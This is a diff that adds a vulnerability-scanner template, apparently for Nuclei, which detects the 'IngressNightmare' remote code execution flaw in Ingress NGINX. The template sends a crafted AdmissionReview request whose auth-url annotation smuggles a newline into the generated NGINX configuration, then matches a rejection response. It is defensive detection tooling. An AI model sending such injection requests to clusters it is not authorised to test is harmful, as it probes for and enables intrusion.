@@ -1,0 +1,103 @@
+id: ingress-nginx-unauthorized-rce
+info:
+  name: IngressNightmare Ingress NGINX Unauthorized Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "kind": "AdmissionReview",
+          "apiVersion": "admission.k8s.io/v1",
+          "request": {
+            "uid": "test-uid",
+            "kind": {
+              "group": "networking.k8s.io",
+              "version": "v1",
+              "kind": "Ingress"
+            },
+            "resource": {
+              "group": "networking.k8s.io",
+              "version": "v1",
+              "resource": "ingresses"
+            },
+            "requestKind": {
+              "group": "networking.k8s.io",
+              "version": "v1",
+              "kind": "Ingress"
+            },
+            "requestResource": {
+              "group": "networking.k8s.io",
+              "version": "v1",
+              "resource": "ingresses"
+            },
+            "name": "minimal-ingress",
+            "namespace": "default",
+            "operation": "CREATE",
+            "userInfo": {
+              "uid": "test-uid"
+            },
+            "object": {
+              "kind": "Ingress",
+              "apiVersion": "networking.k8s.io/v1",
+              "metadata": {
+                "name": "minimal-ingress",
+                "namespace": "default",
+                "creationTimestamp": null,
+                "annotations": {
+                  "nginx.ingress.kubernetes.io/auth-url": "http://example.com/#;\nabcd1111111111"
+                }
+              },
+              "spec": {
+                "ingressClassName": "nginx",
+                "rules": [
+                  {
+                    "host": "www.example.com",
+                    "http": {
+                      "paths": [
+                        {
+                          "path": "/",
+                          "pathType": "Prefix",
+                          "backend": {
+                            "service": {
+                              "name": "kubernetes",
+                              "port": {
+                                "number": 443
+                              }
+                            }
+                          }
+                        }
+                      ]
+                    }
+                  }
+                ]
+              },
+              "status": {
+                "loadBalancer": {}
+              }
+            },
+            "oldObject": null,
+            "dryRun": true,
+            "options": {
+              "kind": "CreateOptions",
+              "apiVersion": "meta.k8s.io/v1"
+            }
+          }
+        }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"uid\": \"test-uid\""
+          - "\"allowed\": false"
+          - "\"code\": 400"
+          - "\"response\": {"
+        part: body
